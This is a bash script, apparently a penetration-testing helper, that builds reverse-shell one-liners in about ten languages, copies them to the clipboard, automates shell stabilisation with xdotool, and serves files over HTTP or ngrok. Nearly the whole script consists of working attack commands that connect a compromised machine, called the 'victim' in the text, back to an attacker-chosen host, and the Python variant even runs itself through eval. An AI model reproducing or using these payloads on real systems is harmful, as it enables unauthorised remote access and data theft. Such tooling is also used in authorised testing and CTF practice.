#!/bin/bash

function banner(){
	echo -e " ______  _____ _____ _   _      _
 | ___ \/  __ \  ___| | | |    | |
 | |_/ /| /  \/ |__ | |_| | ___| |_ __   ___ _ __
 |    / | |   |  __||  _  |/ _ \ | '_ \ / _ \ '__|
 | |\ \ | \__/\ |___| | | |  __/ | |_) |  __/ |
 \_| \_| \____|____/\_| |_/\___|_| .__/ \___|_|
   \e[93mCoder:\e[0m                        | |
         \e[92mNicholas Ferreira\e[0m       |_|
         "
	echo " Usage: $0 [option]
 See more options with --help or -h
	"
}

if [[ "$1" == "" ]]; then
	banner
	exit 1
elif [[ "$1" == "-h" || "$1" == "--help" ]]; then
	banner
	printf "\nUsage: $0 [options]\n"
	echo ""
	echo "Options:
	pty - Spawn a pty shell
	reverse/rev - Get a reverse shell
	upload/up - Upload a file via HTTP
	"
	exit 1
fi


ips_cmd="`hostname -I`" #String containing the IPs from interfaces
ips=($ips_cmd) #String to array

case "$1" in
	"pty")
		printf "Select the type of TTY shell to spawn (default=script):\n"
		printf "[1] Script\n"
		printf "[2] Python3\n"
		printf "[3] Python\n"
		printf "[4] Perl\n"
		printf "[5] sh\n"
		read tipo
		if [[ -z $tipo ]]; then #run default (python3)
			cmd="$(which script) -qc /bin/bash /dev/null"
			echo -n "$cmd" | xsel -ib
			printf "\e[92m[+] Copied to clipboard: $cmd"
		fi

		case $tipo in
			1)
				cmd="$(which script) -qc /bin/bash /dev/null"
				echo -n "$cmd" | xsel -ib
				printf "\e[92m[+] Copied to clipboard: $cmd"
				;;
			2)
				cmd="python3 -c \"import pty;pty.spawn('/bin/bash')\""
				echo -n "$cmd" | xsel -ib
				printf "\e[92m[+] Copied to clipboard: $cmd"
				;;
			3)
				cmd="python -c \"import pty;pty.spawn('/bin/bash')\""
				echo -n "$cmd" | xsel -ib
				printf "\e[92m[+] Copied to clipboard: $cmd"
				;;
			4)
				cmd="perl -e \"exec '/bin/bash'\""
				echo -n "$cmd" | xsel -ib
				printf "\e[92m[+] Copied to clipboard: $cmd"
				;;
			5)
				cmd="sh -i"
				echo -n "$cmd" | xsel -ib
				printf "\e[92m[+] Copied to clipboard: $cmd"
				;;

		esac
			printf "\n\nDo you want to stabilize your shell? [Y/n]\n"
			read stabilize

#			echo $stabilize

			if [[ (${stabilize:0:1} == "Y" || ${stabilize:0:1} == "y") || $stabilize == "" ]]
			then
				for i in {0..2}
				do
					echo -ne "You have "$((3-$i))" seconds to get your shell terminal on focus\r"
					sleep 1
				done

				printf "\nStabilizing shell...\n"
				xdotool type --delay 0 "$cmd"
				xdotool key Return
				sleep 0.1

				printf "Backgrounding active shell...\n"
				xdotool key Ctrl+z
				sleep 0.25

				printf "Getting terminal dimensions...\n"
				dimensions="stty"$(stty -a | grep rows | awk -F';' '{print $2 $3}') #stty rows <rows> columns <columns>

				printf "Changing stty configuration...\n"
				xdotool type --delay 0 "stty raw -echo"
				xdotool key Return #send {Enter}
				sleep 0.25

				printf "Foregrouding the reverse shell...\n"
				xdotool type --delay 0 "fg"
				xdotool key Return
				sleep 0.25

				printf "Reseting the shell...\n"
				xdotool type --delay 0 "reset"
				xdotool key Return
				sleep 0.25

				printf "Exporting variables...\n"
				xdotool type --delay 0 "xterm-256color"
				xdotool key Return
				xdotool type --delay 0 "export SHELL=bash"
				xdotool key Return
				sleep 0.25
				xdotool type --delay 0 "export TERM=xterm-256color"
				xdotool key Return
				sleep 0.25

				printf "Setting terminal dimensions...\n"
				xdotool type --delay 0 "$dimensions"
				xdotool key Return

				printf "Setting terminal highlight...\n"
				xdotool type --delay 0 "alias ls=\"ls --color=tty\""
				xdotool key Return

				xdotool type --delay 0 "alias grep=\"grep --color=auto\""
				xdotool key Return

				xdotool type --delay o "clear"
				xdotool key Return
			fi

		;;
	"reverse" | "rev")
		printf "\e[96mSelect the type of reverse shell (default=Netcat):\n\e[0m"
		printf "[1] Netcat\n"
		printf "[2] PHP\n"
		printf "[3] Bash\n"
		printf "[4] Python\n"
		printf "[5] Perl\n"
		printf "[6] Powershell\n"
		printf "[7] Ruby\n"
		printf "[8] Socat\n"
		printf "[9] Telnet\n"
		printf "[10] Ncat (encrypted)\n"
		read reverse

		printf "\n\e[96mSelect the LHOST (default=[0]):\n\e[0m"

		extip=$(curl -s http://checkip.amazonaws.com/) #External IP

#		printf "IPs: ${#ips[@]}" #Numbers of IPs

		for index in ${!ips[@]}; do #print each local IP found
			printf "[$index] ${ips[index]} \n"
		done
		printf "[$((${#ips[@]}))] $extip (external)\n"  #Num of IPs + 1 (array count starts at 0)
		printf "[$((${#ips[@]}+1))] Custom\n" #Num os IPs + 2

		read lhost

		if [[ -z $lhost ]]; then #if lhost == ""
			IP=${ips[0]} #ip = default
		else #if lhost isn't default
			IP=${ips[$lhost]}
			if [[ $lhost == ${#ips[@]} ]]; then #if lhost is the external IP
				IP=$extip
			elif [[ $lhost == $((${#ips[@]}+1)) ]]; then #if lhost is custom
				printf "\e[96mType the LHOST: \e[0m"
				read IP
			elif [[ $lhost > $((${#ips[@]}+2))  ]]; then #if lhost is out of bounds
				printf "\e[31m[-] Please select a valid IP address\e[0m\n"
				echo ${#ips[@]}
				exit 1
			fi
		fi

		printf "\n\e[96mSelect the LPORT (default=7359):\n\e[0m"
		read lport

		if [[ -z $lport ]]; then #If it's empty, set to default
			PORT=7359
		elif (( $lport > 0 && $lport < 65536 )); then
			PORT=$lport
		else
			echo -e "\e[31m[-] Port must be between 0 and 65535\e[0m"
			exit 1
		fi

		case $reverse in
			1) #nc
				cmd="nc -e /bin/bash $IP $PORT"
#				sleep 1
#				xdotool type --delay 0 "$cmd" #simulates typing the command
				printf "\e[92m[+] Copied to clipboard: $cmd"
				echo -n "$cmd" | xsel -ib #copy to clipboard
				;;
			2) #php
				cmd="php -r '\$sock=fsockopen(\"$IP\",$PORT);exec(\"/bin/bash <&3 >&3 2>&3\");'"
				printf "\e[92m[+] Copied to clipboard: $cmd"
				echo -n "$cmd" | xsel -ib #copy to clipboard
				;;
			3) #bash
				cmd="bash -i &>/dev/tcp/$IP/$PORT <&1"
				printf "\e[92m[+] Copied to clipboard: $cmd"
				echo -n "$cmd" | xsel -ib #copy to clipboard
				;;
			4) #python
				cmd="python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect(($IP,$PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'"
				printf "\e[92m[+] Copied to clipboard: $cmd"
				echo -n "$cmd" | xsel -ib #copy to clipboard
				eval "$cmd"
				;;

			5) #perl
				cmd="perl -e 'use Socket;\$i=\"$IP\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
				printf "\e[92m[+] Copied to clipboard: $cmd"
				echo -n "$cmd" | xsel -ib #copy to clipboard
				;;
			6) #Powershell
				cmd="powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('\$IP',\$PORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, $i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
				printf "\e[92m[+] Copied to clipboard: $cmd"
				echo -n "$cmd" | xsel -ib #copy to clipboard
				;;
			7) #Ruby
				cmd="ruby -rsocket -e'f=TCPSocket.open(\"$IP\",$PORT).to_i;exec sprintf(\"sh -i <&%d >&%d 2>&%d\",f,f,f)'"
				printf "\e[92m[+] Copied to clipboard: $cmd"
				echo -n "$cmd" | xsel -ib #copy to clipboard
				;;
			8) #Socat (o leao)
				cmd="socat TCP:$IP:$PORT EXEC:'bash',pty,stderr,setsid,sigint,sane"
				printf "\e[92m[+] Copied to clipboard: $cmd"
				echo -n "$cmd" | xsel -ib #copy to clipboard
				;;
			9) #Telnet
				cmd="TF=\$(mktemp -u);mkfifo \$TF && telnet $IP $PORT 0<\$TF | /bin/bash 1>\$TF"
				printf "\e[92m[+] Copied to clipboard: $cmd"
				echo -n "$cmd" | xsel -ib #copy to clipboard
				;;
			10) #Ncat
				printf "Use this to generate a key and certificate:\n$ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 9999\n\nListen (your computer): \n$ ncat -lnvp $PORT --ssl-key key.pem --ssl-cert cert.pem\n\nConnect (victim): \n$ ncat -vn $IP $PORT --ssl\n\n"
				;;
		esac
		;;

	"upload" | "up")
			printf "\e[96mSelect the type of upload (default=Python3):\n\e[0m"
			printf "[1] Python3\n"
			printf "[2] PHP\n"
			printf "[3] Ruby\n"
			printf "[4] Ngrok\n"
			read upload

			printf "\n\e[96mSelect the port (default=9537)\n\e[0m"
			read port
			if [[ -z $port ]]; then port=9537;fi

			printf "\n\e[96mSelect the path (default=$HOME):\n\e[0m"
			read path
			if [[ -z $path ]]; then path=$HOME; fi
			if [[ ! -d $path ]]; then printf "Erro\n"; exit 1; fi

			for index in ${!ips[@]}; do #print each local IP found
				printf "http://${ips[index]}:$port\n"
			done

			case $upload in
				1) #Python
					python3 -m http.server $port -d $path
				;;

				2) #PHP
					cd $path; php -S 0.0.0.0:$port
				;;

				3) #Ruby
					ruby -run -C $path -e httpd . -p $port
				;;
				4) #ngrok
					cd $path; ngrok http $port
				;;
			esac
	;;


esac
